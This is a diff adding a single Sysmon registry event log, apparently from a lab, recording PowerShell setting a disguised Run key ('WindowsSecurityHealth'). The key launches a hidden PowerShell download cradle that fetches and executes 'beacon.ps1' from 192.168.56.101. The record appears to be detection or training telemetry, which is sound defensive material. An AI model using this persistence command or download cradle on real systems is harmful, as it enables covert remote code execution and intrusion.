@@ -1,0 +1,24 @@
+07/29/2026 04:34:52.097 PM
+LogName=Microsoft-Windows-Sysmon/Operational
+EventCode=13
+EventType=4
+ComputerName=Windows10
+User=NOT_TRANSLATED
+Sid=S-1-5-18
+SidType=0
+SourceName=Microsoft-Windows-Sysmon
+Type=Information
+RecordNumber=11373
+Keywords=None
+TaskCategory=Registry value set (rule: RegistryEvent)
+OpCode=Info
+Message=Registry value set:
+RuleName: T1060,RunKey
+EventType: SetValue
+UtcTime: 2026-07-29 11:04:52.079
+ProcessGuid: {a802fc0f-d16b-6a69-4301-000000000d00}
+ProcessId: 5920
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKU\S-1-5-21-134318151-1484639334-2794667223-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityHealth
+Details: powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.101/beacon.ps1')"
+User: WINDOWS10\vboxuser
